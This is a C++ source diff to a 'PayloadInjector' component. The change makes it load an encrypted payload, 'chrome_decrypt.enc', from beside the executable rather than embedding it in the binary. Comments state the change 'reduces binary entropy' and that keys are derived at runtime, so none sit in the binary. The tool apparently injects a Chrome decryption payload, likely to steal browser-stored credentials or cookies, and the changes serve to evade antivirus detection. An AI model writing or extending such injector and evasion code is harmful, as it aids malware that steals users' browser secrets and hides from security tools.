@@ -4,8 +4,8 @@
 #include "injector.hpp"
 #include "../crypto/crypto.hpp"
 #include "../sys/internal_api.hpp"
-#include "../../build/payload_data.hpp"
 #include <sstream>
+#include <fstream>
 
 namespace Injector {
 
@@ -74,17 +74,48 @@ namespace Injector {
     }
 
     void PayloadInjector::LoadAndDecryptPayload() {
-        static_assert(Payload::Embedded::Size > 0, "Embedded payload is empty");
+        // Load encrypted payload from external file (reduces binary entropy)
+        std::filesystem::path payloadPath = GetPayloadFilePath();
+        
+        std::ifstream file(payloadPath, std::ios::binary);
+        if (!file) {
+            throw std::runtime_error("Cannot open payload file: " + payloadPath.string());
+        }
 
         m_payload.assign(
-            Payload::Embedded::Data,
-            Payload::Embedded::Data + Payload::Embedded::Size
+            std::istreambuf_iterator<char>(file),
+            std::istreambuf_iterator<char>()
         );
+        file.close();
+
+        if (m_payload.empty()) {
+            throw std::runtime_error("Payload file is empty: " + payloadPath.string());
+        }
 
         // Use runtime-derived keys (no static keys in binary)
         if (!Crypto::DecryptPayload(m_payload)) {
             throw std::runtime_error("Failed to derive decryption keys");
         }
+    }
+
+    std::filesystem::path PayloadInjector::GetPayloadFilePath() {
+        // Look for chrome_decrypt.enc next to the executable
+        wchar_t exePath[MAX_PATH] = {};
+        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
+        std::filesystem::path dir = std::filesystem::path(exePath).parent_path();
+        std::filesystem::path payloadPath = dir / "chrome_decrypt.enc";
+
+        if (std::filesystem::exists(payloadPath)) {
+            return payloadPath;
+        }
+
+        // Fallback: current working directory
+        payloadPath = std::filesystem::current_path() / "chrome_decrypt.enc";
+        if (std::filesystem::exists(payloadPath)) {
+            return payloadPath;
+        }
+
+        throw std::runtime_error("Payload file not found. Ensure chrome_decrypt.enc is in the same directory as the executable.");
     }
 
     DWORD PayloadInjector::GetExportOffset(const char* exportName) {
